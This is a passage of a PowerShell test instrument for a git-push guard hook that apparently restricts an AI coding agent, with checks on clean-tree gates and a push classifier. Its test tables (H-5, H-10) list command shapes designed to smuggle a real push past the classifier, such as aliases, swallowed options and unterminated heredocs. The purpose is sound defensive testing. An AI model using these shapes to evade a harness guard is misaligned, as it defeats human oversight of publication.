                 elseif ($h16Residual -and (-not $h16Delegates)) { 'RESIDUAL' }
                 elseif ($h16Delegates) { 'BOTH -- the rows cannot tell the two states apart' }
                 else { 'NEITHER -- the live gate is in no recognised state' }
$h16CwdOk      = $h16Complete -and (@($h16SpecRows | Where-Object { -not $_.CwdOk }).Count -eq 0)
$h16DifferRows = @($h16SpecRows | Where-Object { $_.Declared -ne $_.Model })
$h16DifferIds  = (@($h16DifferRows | ForEach-Object { $_.Id }) -join ' ')
$h16MustAgree  = @('a5', 't1', 'a4', 'n1')
$h16AgreeRows  = @($h16SpecRows | Where-Object { $h16MustAgree -ccontains $_.Id })
$h16Agree      = ($h16AgreeRows.Count -eq $h16MustAgree.Count) -and
                 (@($h16AgreeRows | Where-Object { $_.Declared -ne $_.Model }).Count -eq 0)
$h16NonVacuous = ($h16DifferRows.Count -gt 0) -and $h16Agree

$h16AcwReport = (@($h16AcwRows | ForEach-Object {
    $h16Flag   = if ($_.Ok) { 'ok  ' } else { 'RED ' }
    $h16LibTxt = if ($_.NoReader) { 'a copy of the LIVE mission-lib ALONE (no reader)' } else { 'the LIVE tools/mission-lib.ps1 in place' }
    $h16AlTxt  = if ($_.Allow) { "   -AllowPaths '" + $_.Allow + "'" } else { '' }
    $h16NmTxt  = if ($_.LineRefusal) { 'names every offending path [' + (@($_.MustName) -join ' | ') + '] : ' + $_.NamesOk }
                 elseif ($_.Want -eq 1) { 'a DEGRADATION refusal: judged by exit code alone, there is no line to name' }
                 else { 'admitted: judged by exit code alone' }
    $h16NoTxt  = if (@($_.MustNotName).Count -gt 0) { '   and does NOT name the -AllowPaths-exempted [' + (@($_.MustNotName) -join ' | ') + '] : ' + $_.NotNamesOk } else { '' }
    "    $h16Flag$($_.Label)" + "`r`n" +
    "          porcelain shape as specified : $($_.ShapeOk)   [$($_.Shape)]" + "`r`n" +
    "          through $h16LibTxt$h16AlTxt   exit want $($_.Want) got $($_.Got)   $h16NmTxt$h16NoTxt"
}) -join "`r`n")
if ($h16AcwRows.Count -eq 0) { $h16AcwReport = '    <NOT RUN -- no rows were produced>' }
$h16SpecReport = (@($h16SpecRows | ForEach-Object {
    $h16With = @()
    if ($_.Spec -eq $_.Acw)   { $h16With += 'DELEGATES' }
    if ($_.Spec -eq $_.Model) { $h16With += 'RESIDUAL' }
    $h16WithTxt = if ($h16With.Count -gt 0) { ($h16With -join ' + ') } else { 'NEITHER' }
    $h16DiffTxt = if ($_.Declared -ne $_.Model) { '   <- the two states PREDICT DIFFERENTLY here' } else { '' }
    "    $($_.Id)   live spec-accept exit $($_.Spec)   live Assert-CleanWorkingTree exit $($_.Acw)   RESIDUAL model $($_.Model)   agrees with: $h16WithTxt   ran in its scratch root: $($_.CwdOk)$h16DiffTxt"
}) -join "`r`n")
if ($h16SpecRows.Count -eq 0) { $h16SpecReport = '    <NOT RUN -- the extraction, the copies or the generated script did not pass; see above>' }
$h16Loud = if ($h16State -eq 'RESIDUAL') {
    "    !!! THE SPEC-ACCEPT CURE IS OPEN !!! The live Assert-CleanGitTree still carries its own code-constant`r`n" +
    "    list and does NOT call the shared A-126 predicate -- amendment 36's registered divergence, measured`r`n" +
    "    here by behaviour. GREEN BECAUSE IT IS A RECOGNISED STATE, NOT BECAUSE IT IS CURED."
} elseif ($h16State -eq 'DELEGATES') {
    "    THE SPEC-ACCEPT GATE IS CURED, measured by behaviour: the live Assert-CleanGitTree returns the live`r`n" +
    "    Assert-CleanWorkingTree's verdict on every row. The RESIDUAL model is now due for retirement."
} else {
    "    THE LIVE Assert-CleanGitTree IS IN NO RECOGNISED STATE: $h16State"
}
$h16Ok = $h16Present -and $h16AcwOk -and $h16AstOk -and $h16CopiesOk -and $h16GenOk -and $h16CwdOk -and $h16OneState -and $h16NonVacuous

$detail = @"
  THE LIVE CLEAN-TREE GATES, JUDGED BY BEHAVIOUR AND NEVER BY BYTES. H-3 and H-3b
  no longer read tools/mission-lib.ps1 or tools/mission-spec-accept.ps1; this member EXECUTES both.
  live tools/mission-lib.ps1, tools/mission-spec-accept.ps1 and tools/lam/lam-verify-admission.ps1
    present, and the H-3 driver present : $h16Present   (expect True)
  (i) THE LIVE Assert-CleanWorkingTree, dot-sourced IN PLACE through _drv-a126-clean-tree.ps1, over
      $($h16AcwRows.Count) scratch mission roots -- $($execSpec.Count) hand rows and $($sweepBuilt.Count) sweep rows shared with H-3, plus h1 h2 m2 k2.
      Each row: its DECLARED verdict (exit code) over its asserted porcelain shape; a row refused for a
      porcelain LINE names that line's path. Message wording is NOT asserted.
      reader-absent library -- a copy of the live file ALONE in a scratch directory, byte-identical to
      the live file, no lam/ beside it : $h16NoReaderOk   (expect True)
$h16AcwReport
      ALL ROWS : $h16AcwOk   (expect True)
  (ii) THE LIVE Assert-CleanGitTree, EXECUTED from a verbatim AST extract of tools/mission-spec-accept.ps1
      sha256 $h16LiveSpecSha, decoded as PowerShell 5.1 decodes it to run it: $h16Encoding
      parse errors : $h16ParseErrors (expect 0)   top-level calls of the gate : $h16Calls (expect at least 1)
      top-level ErrorActionPreference assignments before the call : $($h16EapStmts.Count), of which = 'Stop' : $h16Eap   (expect 1 and 1)
      top-level Set-StrictMode statements before the call : $($h16StrictStmts.Count), of which -Version Latest : $h16Strict   (expect 1 and 1)
      top-level functions defined before the call, emitted VERBATIM in file order : $($h16Fns.Count) [$h16FnNames]
      Assert-CleanGitTree among them exactly once : $($h16GateDefs -eq 1)
      the decoding round-trips the file's bytes : $h16RoundTrip   every emitted extent is byte-identical to its slice of the file : $h16SlicesExact
      AST context and extraction : $h16AstOk   (expect True)
      HASH-CHECKED copies of the live mission-lib.ps1 and lam\lam-verify-admission.ps1 beside the
      generated script in a scratch tools\ (the live tools\ is never written) : $h16CopiesOk   (expect True)
      generated script written and parses (errors $h16GenParseErrs) : $h16GenOk   (expect True)
      every child ran with its scratch root as working directory (marker line) : $h16CwdOk   (expect True)
      rows judged (no -AllowPaths, no reader-absent library) : $h16SpecN of $h16ExpectN
$h16SpecReport
    CLASSIFICATION -- EXACTLY ONE state must hold on EVERY row:
      DELEGATES (CURED) -- equals the live Assert-CleanWorkingTree : $h16Delegates
      RESIDUAL  (OPEN)  -- equals the uncured code-constant model  : $h16Residual
      exactly one state : $h16OneState   (expect True)
      STATE : $h16State
$h16Loud
    NON-VACUITY -- the two states PREDICT DIFFERENTLY on at least one row : $($h16DifferRows.Count -gt 0)   (expect True)
      they differ on : $h16DifferIds
      and they AGREE where they must (a5 a plain stray, t1 a clean tree, a4 a tracked modification,
      n1 a failing git status) : $h16Agree   (expect True)
  WHAT THIS MEMBER DOES NOT REACH: the lifecycle CLIs' own call sites -- reopen, promote-contract,
  ledger-append, close-milestone, reclose, spec-bump, green-gate-seed, prune-objects -- are NOT
  asserted to call the predicate; message wording is NOT asserted; only Assert-CleanGitTree is executed
  out of tools/mission-spec-accept.ps1; the RESIDUAL model is a transcript of the uncured list as read,
  and is to be RETIRED in the commit that lands the spec-accept cure (until then a regression from
  DELEGATES back to exactly that behaviour reads green here); every row-set limit H-3 states for its
  execution leg applies here unchanged.
"@
Check -Id 'H-16' -Title 'the LIVE clean-tree gates are judged by BEHAVIOUR, never by bytes: the live Assert-CleanWorkingTree, executed in place over H-3''s scratch mission roots, returns every declared verdict and names every refused line''s path, and the live Assert-CleanGitTree, executed from a verbatim AST extract, is EXACTLY ONE of DELEGATES (cured) or RESIDUAL (open) on every row, over rows on which the two states demonstrably differ' `
      -Ok $h16Ok -Detail $detail

# The scratch mission roots are removed only now, after BOTH H-3's leg and H-16 have judged them.
Remove-Item -LiteralPath $applyDir -Recurse -Force -ErrorAction SilentlyContinue

# =============================================================================================
# H-4 -- the 14-check A1 negative suite passes UNCHANGED against the next-gen hooks
# =============================================================================================
# The suite hard-anchors $hooksDir to its own parent's 'hooks' and $repoRoot to three levels up
# (test-a1-negative.ps1:44-51), so the staging layout tools/evidence-hooks-next/{hooks,tests}
# resolves it against the NEXT-GEN hooks while $repoRoot stays the real repo root (N10 needs that).
# PS 5.1 TRAP, and it is load-bearing here. Under $ErrorActionPreference = 'Stop', ANY output a
# native executable writes to stderr is raised as a fatal NativeCommandError -- and `2>$null` does
# not help, because the error is raised on the write, not on the read. The A1 negative suite
# DRIVES DENY PATHS ON PURPOSE (N2 alone issues a dozen), and the guard writes every refusal to
# stderr by design. So the suite's correct behaviour would abort the instrument that runs it.
# Error branches must be driven, not read: preference is relaxed around this call only, and
# restored in `finally` so the rest of the instrument keeps failing fast.
$prevEap = $ErrorActionPreference
$ErrorActionPreference = 'Continue'
try {
    $suiteOut  = & powershell -NoProfile -ExecutionPolicy Bypass -File $suitePath 2>&1
    $suiteExit = $LASTEXITCODE
}
finally { $ErrorActionPreference = $prevEap }
$suiteText = ($suiteOut | Out-String)
$passLines = @([regex]::Matches($suiteText, '(?m)^\[PASS\] ')).Count
$failLines = @([regex]::Matches($suiteText, '(?m)^\[FAIL\] ')).Count
$totalRun  = $passLines + $failLines
$failedIds = @([regex]::Matches($suiteText, '(?m)^\[FAIL\] (\S+)') | ForEach-Object { $_.Groups[1].Value })
$detail = @"
  suite      : $suitePath
  exit code  : $suiteExit   (expect 0)
  checks run : $totalRun   (expect 14 -- N1 N2 N3 N4 N5 N6 N7 N8 N9 N10 N11 N12 N12b N12c)
  passed     : $passLines
  failed     : $failLines$(if ($failedIds.Count) { "   -> $($failedIds -join ', ')" })
"@
Check -Id 'H-4' -Title 'the 14-check A1 negative suite passes unchanged against the next-gen hooks' `
      -Ok ($suiteExit -eq 0 -and $totalRun -eq 14 -and $failLines -eq 0) -Detail $detail

if ($suiteExit -ne 0 -or $failLines -gt 0) {
    Write-Host ""
    Write-Host "  --- A1 suite output (regression detail) ---"
    Write-Host $suiteText
}

# =============================================================================================
# H-5 -- THE PUSH CLASSIFIER REFUSES PUBLICATION AND ONLY PUBLICATION
# =============================================================================================
# THE DEFECT: "git unpack-file <blob> is classified as a push by the verb scan ('push is
# BLOCKED: no unconsumed push gate ...') -- a read-only plumbing command refused."
#
# BOTH DIRECTIONS OR IT MEASURES NOTHING. A member that only asserted the widened words are now
# admitted would pass just as well against a classifier that had been switched off, and switching it
# off is the failure this build cannot afford: the one it guards is ADR-033 irreversible. So the
# refuse-now corpus is carried in the same table as the admits, and the two are counted separately
# so a run that loses one of them cannot be read as a run that lost nothing.
#
# THE KILL ROW IS R-16 AND IT IS THE REASON THIS MEMBER EXISTS AT ALL. Cure B strips heredoc BODIES
# before the scan, because a body line is newline-separated like any other and a commit message
# mentioning git was being refused as a publication. A stripper without its fence would swallow a
# real push placed after an opener that never terminates. R-16 is exactly that shape and it must
# stay a push; if it ever goes green, the fence is gone and the classifier can be walked past with
# three extra characters.
$h5Rows = @(
    [pscustomobject]@{ id = 'R-01'; expect = $true;  why = 'the plain publication';                    cmd = 'git push origin main' }
    [pscustomobject]@{ id = 'R-02'; expect = $true;  why = 'the executable spelled with its suffix';   cmd = 'git.exe push' }
    [pscustomobject]@{ id = 'R-03'; expect = $true;  why = 'an attached main option before the verb';  cmd = 'git --git-dir=.git push' }
    [pscustomobject]@{ id = 'R-04'; expect = $true;  why = 'parenthesised subshell';                   cmd = '(git push origin main)' }
    [pscustomobject]@{ id = 'R-05'; expect = $true;  why = 'the executable quoted';                    cmd = '"git" push' }
    [pscustomobject]@{ id = 'R-06'; expect = $true;  why = 'subtree delegates to push';                cmd = 'git subtree push' }
    [pscustomobject]@{ id = 'R-07'; expect = $true;  why = 'lfs push takes no ref-push path at all';   cmd = 'git lfs push' }
    [pscustomobject]@{ id = 'R-08'; expect = $true;  why = 'svn dcommit publishes, invisible to S-4';  cmd = 'git svn dcommit' }
    [pscustomobject]@{ id = 'R-09'; expect = $true;  why = 'for-each-repo publishes N repositories';   cmd = 'git --config=x for-each-repo push' }
    [pscustomobject]@{ id = 'R-10'; expect = $true;  why = 'a single ampersand is a separator';        cmd = 'git status & git push origin main' }
    [pscustomobject]@{ id = 'R-11'; expect = $true;  why = 'the verb spelled through a variable';      cmd = 'p=push; git $p origin main' }
    [pscustomobject]@{ id = 'R-12'; expect = $true;  why = 'the three-line block the Bash tool runs';  cmd = ('git add -A' + [char]10 + 'git commit -m x' + [char]10 + 'git push origin main') }
    [pscustomobject]@{ id = 'R-13'; expect = $true;  why = 'THE INVERSION: an unknown word refuses';   cmd = 'git frobnicate' }
    [pscustomobject]@{ id = 'R-14'; expect = $true;  why = 'deliberately kept off the widened list';   cmd = 'git send-pack origin' }
    [pscustomobject]@{ id = 'R-15'; expect = $true;  why = 'deliberately kept off the widened list';   cmd = 'git receive-pack .' }
    [pscustomobject]@{ id = 'R-16'; expect = $true;  why = 'CURE-B KILL ROW: UNTERMINATED heredoc, so nothing may be stripped and the push stays visible';
                                                     cmd = ('git commit -F - <<EOF' + [char]10 + 'msg' + [char]10 + 'git push origin main') }
    [pscustomobject]@{ id = 'A-01'; expect = $false; why = 'THE DEFECT ITSELF: red at the base of this edit, green at its tip';
                                                     cmd = 'git unpack-file abc123' }
    [pscustomobject]@{ id = 'A-02'; expect = $false; why = 'its neighbour, on the list all along';     cmd = 'git unpack-objects -q' }
    [pscustomobject]@{ id = 'A-03'; expect = $false; why = 'widened: a local export to stdout';        cmd = 'git fast-export --all' }
    [pscustomobject]@{ id = 'A-04'; expect = $false; why = 'widened: builds a local tree object';      cmd = 'git mktree' }
    [pscustomobject]@{ id = 'A-05'; expect = $false; why = 'widened: validates a refname string';      cmd = 'git check-ref-format --branch x' }
    [pscustomobject]@{ id = 'A-06'; expect = $false; why = 'widened: replays onto a local base';       cmd = 'git replay --onto main a..b' }
    [pscustomobject]@{ id = 'A-07'; expect = $false; why = 'the re-issued form the heredoc commit had to use';    cmd = 'git commit -F msg.txt' }
    [pscustomobject]@{ id = 'A-08'; expect = $false; why = 'ordinary ceremony';                        cmd = 'git status' }
    [pscustomobject]@{ id = 'A-09'; expect = $false; why = 'ordinary ceremony';                        cmd = 'git log --oneline' }
    [pscustomobject]@{ id = 'A-10'; expect = $false; why = 'ordinary plumbing';                        cmd = 'git cat-file -p HEAD' }
    [pscustomobject]@{ id = 'A-11'; expect = $false; why = 'CURE B: a TERMINATED heredoc whose body mentions the guard -- red at the base';
                                                     cmd = ("git commit -F - <<'EOF'" + [char]10 + 'the git push guard was fixed' + [char]10 + 'EOF') }
    [pscustomobject]@{ id = 'A-12'; expect = $false; why = 'a heredoc body of plain prose: green at both ends, so a disabled scan cannot masquerade as this cure';
                                                     cmd = ("git commit -F - <<'EOF'" + [char]10 + 'plain prose about nothing in particular' + [char]10 + 'EOF') }
)
$h5Lines = New-Object System.Collections.Generic.List[string]
$h5Bad = 0; $h5Refuse = 0; $h5Admit = 0; $h5RefuseOk = 0; $h5AdmitOk = 0
foreach ($r in $h5Rows) {
    $got = [bool](Test-EvidencePushCommand -Command $r.cmd)
    $ok  = ($got -eq $r.expect)
    if ($r.expect) { $h5Refuse++; if ($ok) { $h5RefuseOk++ } } else { $h5Admit++; if ($ok) { $h5AdmitOk++ } }
    if (-not $ok) { $h5Bad++ }
    $shown = ($r.cmd -replace [string][char]10, ' <NL> ')
    [void]$h5Lines.Add(('      {0}  expected={1,-5} measured={2,-5} {3}   {4}' -f $r.id, $r.expect, $got, $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $shown))
    [void]$h5Lines.Add('              ' + $r.why)
}
# NON-VACUITY: a table that lost its rows would report zero divergences and prove nothing.
$h5Reached = ($h5Refuse -eq 16 -and $h5Admit -eq 12)
$h5detail = @"
    THE DEFECT -- a read-only plumbing command was refused as a publication. The cure is DATA, not a
    new test: the closed non-push list is widened from a driven census of this host's own git.
    The order that opened the row asked for a positive push-VERB allowlist; that was refused,
    because it cannot decide 'git -c alias.zz=push zz origin' from the command text at all. The
    inversion stays and the list carries the cost.
    refuse-now rows : $h5RefuseOk of $h5Refuse still classified as a push
    still-admits    : $h5AdmitOk of $h5Admit classified as not-a-push
    divergences     : $h5Bad   (expect 0)
    table reached   : $h5Reached   (expect True -- 16 refuse rows and 12 admit rows)
$($h5Lines -join ([string][char]10))
"@
Check -Id 'H-5' -Title 'the push classifier refuses publication and ONLY publication: the 16-row publishing corpus stays refused, and read-only plumbing, a heredoc commit and the widened verbs are admitted' `
      -Ok (($h5Bad -eq 0) -and $h5Reached) -Detail $h5detail

# =============================================================================================
# H-10 -- GIT REPORTING ON ITSELF IS NOT A PUBLICATION
# =============================================================================================
# THE FOURTH push over-refusal, recorded earlier and LEFT OPEN at LAM-ACCEPT.md
# :176-185: a segment naming git with NO POSITIONAL TOKEN AT ALL -- `git --version`,
# `git --list-cmds=main`, `git --exec-path` -- was classified a publication by the fail-closed
# "no shape at all is the most unrecognised shape" rule. It refused this build's own census
# command. Driven at the base of this edit: all eleven P-rows below class 'push', Test True.
#
# THE FALSE-ALLOW ANALYSIS IS THE MEMBER, NOT AN APPENDIX TO IT. The scanner does `$j++` on a
# member of $script:EvidenceGitValueOpts -- it SWALLOWS THE NEXT TOKEN -- so
# `git --exec-path push origin main` reaches the end of the loop with no positional token seen. A
# naive "no positional means not-a-push" cure ADMITS THAT REAL PUSH. Q-01 is the kill row for this
# member the way R-16 is for H-5: if it ever goes green, the admission has stopped being
# invalidated by a swallowed value and the classifier can be walked past with one global option.
# Q-08..Q-14 carry the same shape for every OTHER member of that array, because the lesson the
# library records twice is that special-casing one member of a family is how this gets missed.
#
# THE OTHER DIRECTION IS CARRIED IN THE SAME TABLE AND COUNTED SEPARATELY, so a run that lost the
# refuse rows cannot read as a run that lost nothing. Q-06 (`git --frobnicate`) is the inversion's
# own point restated for FLAGS: an unknown bare flag is on no list and still refuses. Q-19 (bare
# `git`) is the shape that really has no tokens at all and does not move. U-01 and U-02 assert the
# ORDERING survives the narrowing: a command this branch now admits, but which carries a shell
# expansion, must class 'unreadable' -- NOT 'none'. The refusal is kept and only its name changes,
# which is exactly what H-6 settled for the heredoc commit.
#
# BOTH VERDICTS ARE REPORTED FOR EVERY ROW -- Get-EvidenceGitRefusalClass AND the [bool] predicate
# WP-4 depends on -- so a reader can see which of the two moved when one of them does.
$h10Rows = @(
    [pscustomobject]@{ id = 'P-01'; want = 'none'; why = 'THE DEFECT ITSELF: red at the base of this edit, green at its tip'; cmd = 'git --version' }
    [pscustomobject]@{ id = 'P-02'; want = 'none'; why = 'BARE ONLY: reports the path, swallows nothing';                  cmd = 'git --exec-path' }
    [pscustomobject]@{ id = 'P-03'; want = 'none'; why = 'prints a path and exits';                                        cmd = 'git --html-path' }
    [pscustomobject]@{ id = 'P-04'; want = 'none'; why = 'ATTACHED ONLY: the value rides inside the token';                cmd = 'git --list-cmds=main' }
    [pscustomobject]@{ id = 'P-05'; want = 'none'; why = 'prints build configuration and exits';                           cmd = 'git --build-options' }
    [pscustomobject]@{ id = 'P-06'; want = 'none'; why = 'prints a path and exits';                                        cmd = 'git --man-path' }
    [pscustomobject]@{ id = 'P-07'; want = 'none'; why = 'prints a path and exits';                                        cmd = 'git --info-path' }
    [pscustomobject]@{ id = 'P-08'; want = 'none'; why = 'the short usage flag';                                           cmd = 'git -h' }
    [pscustomobject]@{ id = 'P-09'; want = 'none'; why = 'the long usage flag';                                            cmd = 'git --help' }
    [pscustomobject]@{ id = 'P-10'; want = 'none'; why = 'the census form with a comma-joined value';                      cmd = 'git --list-cmds=builtins,main' }
    [pscustomobject]@{ id = 'P-11'; want = 'none'; why = "THE BUILD'S OWN CENSUS COMMAND: both halves report, neither publishes"; cmd = 'git --exec-path && git --list-cmds=main' }
    [pscustomobject]@{ id = 'Q-01'; want = 'push'; why = 'KILL ROW: --exec-path SWALLOWS the verb, so no positional is seen and a naive cure would admit a REAL push'; cmd = 'git --exec-path push origin main' }
    [pscustomobject]@{ id = 'Q-02'; want = 'push'; why = 'the value-opt family: -C swallows its path';                     cmd = 'git -C /other push' }
    [pscustomobject]@{ id = 'Q-03'; want = 'push'; why = 'attached main option, off the literal list';                     cmd = 'git --git-dir=.git push' }
    [pscustomobject]@{ id = 'Q-04'; want = 'push'; why = 'the alias route H-5 records as the fail-OPEN class';             cmd = 'git -c alias.zz=push zz origin' }
    [pscustomobject]@{ id = 'Q-05'; want = 'push'; why = 'the plain publication';                                          cmd = 'git push' }
    [pscustomobject]@{ id = 'Q-06'; want = 'push'; why = 'THE INVERSION FOR FLAGS: an UNKNOWN bare flag is on no list';    cmd = 'git --frobnicate' }
    [pscustomobject]@{ id = 'Q-07'; want = 'push'; why = 'an admitted first segment must not launder the second';          cmd = 'git --version && git push origin main' }
    [pscustomobject]@{ id = 'Q-08'; want = 'push'; why = 'the family, member by member: --git-dir separated';              cmd = 'git --git-dir .git push' }
    [pscustomobject]@{ id = 'Q-09'; want = 'push'; why = 'the family: --work-tree separated';                              cmd = 'git --work-tree . push' }
    [pscustomobject]@{ id = 'Q-10'; want = 'push'; why = 'the family: --namespace separated';                              cmd = 'git --namespace ns push' }
    [pscustomobject]@{ id = 'Q-11'; want = 'push'; why = 'the family: --super-prefix separated';                           cmd = 'git --super-prefix p push' }
    [pscustomobject]@{ id = 'Q-12'; want = 'push'; why = 'the family: --attr-source separated';                            cmd = 'git --attr-source r push' }
    [pscustomobject]@{ id = 'Q-13'; want = 'push'; why = 'the family: --config-env separated';                             cmd = 'git --config-env k=v push' }
    [pscustomobject]@{ id = 'Q-14'; want = 'push'; why = 'the family: --object-directory separated';                       cmd = 'git --object-directory d push' }
    [pscustomobject]@{ id = 'Q-15'; want = 'push'; why = 'an admitted flag SWALLOWED as a value does not admit the segment'; cmd = 'git --exec-path --version' }
    [pscustomobject]@{ id = 'Q-16'; want = 'push'; why = 'the ATTACHED --exec-path SETS the path, it does not report it';  cmd = 'git --exec-path=/x push' }
    [pscustomobject]@{ id = 'Q-17'; want = 'push'; why = 'the BARE --list-cmds is deliberately off the literal list';      cmd = 'git --list-cmds' }
    [pscustomobject]@{ id = 'Q-18'; want = 'push'; why = 'an admitted flag does not admit a positional verb after it';     cmd = 'git -h push' }
    [pscustomobject]@{ id = 'Q-19'; want = 'push'; why = 'NO TOKENS AT ALL: the fail-closed rule is narrowed, not removed'; cmd = 'git' }
    [pscustomobject]@{ id = 'Q-20'; want = 'push'; why = 'a positional word still decides, admitted flags or not';         cmd = 'git --version zz origin' }
    [pscustomobject]@{ id = 'U-01'; want = 'unreadable'; why = 'ORDERING: an admitted shape carrying an expansion is UNREADABLE, never none'; cmd = 'git --list-cmds=$KIND' }
    [pscustomobject]@{ id = 'U-02'; want = 'unreadable'; why = 'the same across segments: the guard still cannot read it'; cmd = 'git --version && echo $HOME' }
)
$h10Lines = New-Object System.Collections.Generic.List[string]
$h10Bad = 0; $h10Admit = 0; $h10Refuse = 0; $h10Unread = 0
$h10AdmitOk = 0; $h10RefuseOk = 0; $h10UnreadOk = 0
foreach ($r in $h10Rows) {
    $cls  = [string](Get-EvidenceGitRefusalClass -Command $r.cmd)
    $bool = [bool](Test-EvidencePushCommand -Command $r.cmd)
    # THE TWO VERDICTS ARE JUDGED TOGETHER. The [bool] is DEFINED as "class is not none" (H-6), so
    # a row where they disagree means that definition has been unpicked -- a failure of this member
    # even when the class alone reads correctly.
    $ok = ($cls -eq $r.want) -and ($bool -eq ($r.want -ne 'none'))
    switch ($r.want) {
        'none'       { $h10Admit++;  if ($ok) { $h10AdmitOk++ } }
        'unreadable' { $h10Unread++; if ($ok) { $h10UnreadOk++ } }
        default      { $h10Refuse++; if ($ok) { $h10RefuseOk++ } }
    }
    if (-not $ok) { $h10Bad++ }
    [void]$h10Lines.Add(('      {0}  want={1,-11} class={2,-11} Test={3,-5} {4}   {5}' -f `
        $r.id, $r.want, $cls, $bool, $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $r.cmd))
    [void]$h10Lines.Add('              ' + $r.why)
}
# THE MANDATORY DENY CONTROL. The hooks are not live here and the predicate is called directly, so
# a mis-wired apparatus -- wrong library, renamed parameter -- could ALLOW EVERYTHING and every
# admit row above would read green for the wrong reason. Two correctly-spelled commands that MUST
# refuse are driven in the same call: if either allows, this member fails and its figures are void.
$h10CtlPush = [string](Get-EvidenceGitRefusalClass -Command 'git push origin main')
$h10CtlUnk  = [string](Get-EvidenceGitRefusalClass -Command 'git frobnicate')
$h10Control = ($h10CtlPush -eq 'push') -and ($h10CtlUnk -eq 'push') -and
              ([bool](Test-EvidencePushCommand -Command 'git push origin main'))
# H-5 DID NOT MOVE, re-asserted from the very table H-5 drove above rather than from a copy of it.
# Narrowing the no-positional corner must not touch one row of the 28.
$h10H5Held = (($h5Bad -eq 0) -and ($h5RefuseOk -eq 16) -and ($h5AdmitOk -eq 12))
# H-6 DID NOT MOVE either, in the half that is pure classifier and needs no fixture: the heredoc
# shape still classes 'unreadable', and a command that is BOTH unreadable and a real push still
# classes 'push' -- the ordering H-6 g) guards. H-6's own nine assertions run below unchanged.
$h10Row125 = "git commit -F - <<'EOF'" + [char]10 +
             ('fix: ' + [char]96 + '_is_valid_slug' + [char]96 + ' is now checked before dispatch') + [char]10 +
             'EOF'
$h10H6a = ([string](Get-EvidenceGitRefusalClass -Command $h10Row125) -eq 'unreadable')
$h10H6g = ([string](Get-EvidenceGitRefusalClass -Command 'git ${x}push origin main') -eq 'push')
$h10H6Held = ($h10H6a -and $h10H6g)
# NON-VACUITY: a table that lost its rows would report zero divergences and prove nothing.
$h10Reached = ($h10Admit -eq 11 -and $h10Refuse -eq 20 -and $h10Unread -eq 2)
$h10detail = @"
    THE DEFECT -- git reporting on ITSELF was refused as a publication. The cure is a CLOSED, LITERAL
    allowlist of non-value-taking, publication-incapable global options, INVALIDATED by any token
    the scan consumed as a separated value. The list stays literal: deriving it from a running git
    would let a future version silently widen what the gate admits, the fail-OPEN direction.
    admitted rows    : $h10AdmitOk of $h10Admit classified 'none'   (every one of them red at the base)
    refused rows     : $h10RefuseOk of $h10Refuse still classified 'push'
    unreadable rows  : $h10UnreadOk of $h10Unread classified 'unreadable', not 'none'
    divergences      : $h10Bad   (expect 0)
    DENY CONTROL     : $h10Control   (expect True -- push='$h10CtlPush', frobnicate='$h10CtlUnk')
    H-5 did not move : $h10H5Held   (expect True -- 16 refuse / 12 admit / 0 divergences)
    H-6 did not move : $h10H6Held   (expect True -- heredoc unreadable=$h10H6a, ordering=$h10H6g)
    table reached    : $h10Reached   (expect True -- 11 admit, 20 refuse, 2 unreadable)
$($h10Lines -join ([string][char]10))
"@
Check -Id 'H-10' -Title 'git reporting on ITSELF is not a publication: a closed literal allowlist of non-value-taking global options is admitted, while a swallowed separated value, an unknown flag and every real push stay refused, and H-5 and H-6 do not move' `
      -Ok (($h10Bad -eq 0) -and $h10Control -and $h10H5Held -and $h10H6Held -and $h10Reached) -Detail $h10detail

# =============================================================================================
# H-6 -- A GIT COMMAND THE GUARD CANNOT READ IS REFUSED UNDER ITS OWN NAME
# =============================================================================================
# THE DEFECT: a 'git commit -F -' with a heredoc was refused with "push is BLOCKED: no
# unconsumed push gate is bound to <the tip>...". No push was attempted. The refusal was LAWFUL under
# the guard's rules -- the message body carried backticks and the unreadable-command rule fired -- but its
# text misnamed the class, and the operator had to reconstruct from the ledger what had happened.
#
# THIS MEMBER MEASURES A SENTENCE, NOT A VERDICT, AND THE CONTROL IS WHAT MAKES IT ABLE TO FAIL.
# The heredoc shape must still DENY; only its reason may change. The real push in the same sandbox
# must still deny with the byte-identical "push is BLOCKED: no unconsumed push gate is bound to" --
# a cure that softened the real sentence too would pass a one-sided member and lose the gate.
#
# THE ORDERING CONTROL IS THE THIRD ROW AND IT IS THE ONE THAT COULD HAVE GONE WRONG SILENTLY.
# Splitting the finding reversed the two tests: push_segment is now asked FIRST. A command that is
# BOTH unreadable and carries a real push segment must class 'push', or a real publication would
# start refusing under a sentence that says no push was detected.
#
# THE SANDBOX IS ITS OWN REPOSITORY, gitless of any gate, so the control does not depend on what
# the surrounding repository's gate directory happens to hold on the day this is run.
$h6Repo = Join-Path $sandbox 'h6-gateless'
New-Item -ItemType Directory -Path $h6Repo -Force | Out-Null
New-Item -ItemType Directory -Path (Join-Path $h6Repo '.mission\gates') -Force | Out-Null
$h6Tip = ''
$prevEap = $ErrorActionPreference
$ErrorActionPreference = 'Continue'
try {
    $h6Hooks = Join-Path $h6Repo '.git\hooks'
    & git init -q $h6Repo 2>&1 | Out-Null
    & git -C $h6Repo config user.email 'instrument@lam.invalid' 2>&1 | Out-Null
    & git -C $h6Repo config user.name  'lam-wp1-instrument' 2>&1 | Out-Null
    & git -C $h6Repo config commit.gpgsign false 2>&1 | Out-Null
    & git -C $h6Repo config core.hooksPath $h6Hooks 2>&1 | Out-Null
    [System.IO.File]::WriteAllText((Join-Path $h6Repo 'seed.txt'), 'seed')
    & git -C $h6Repo add seed.txt 2>&1 | Out-Null
    & git -C $h6Repo commit -q -m 'seed' 2>&1 | Out-Null
    $h6Tip = ("$(& git -C $h6Repo rev-parse HEAD 2>&1)").Trim()
}
finally { $ErrorActionPreference = $prevEap }

$h6Row125 = "git commit -F - <<'EOF'" + [char]10 +
            ('fix: ' + [char]96 + '_is_valid_slug' + [char]96 + ' is now checked before dispatch') + [char]10 +
            'EOF'
$prevProj = $env:CLAUDE_PROJECT_DIR
$env:CLAUDE_PROJECT_DIR = $h6Repo
try {
    $h6ClsU   = [string](Get-EvidenceGitRefusalClass -Command $h6Row125)
    $h6ClsP   = [string](Get-EvidenceGitRefusalClass -Command 'git push origin main')
    $h6ClsOrd = [string](Get-EvidenceGitRefusalClass -Command 'git ${x}push origin main')
    $h6ClsN   = [string](Get-EvidenceGitRefusalClass -Command 'echo hello')
    # THE PAYLOAD IS A PSCustomObject, NOT A HASHTABLE, AND THAT IS NOT COSMETIC. The guard reads
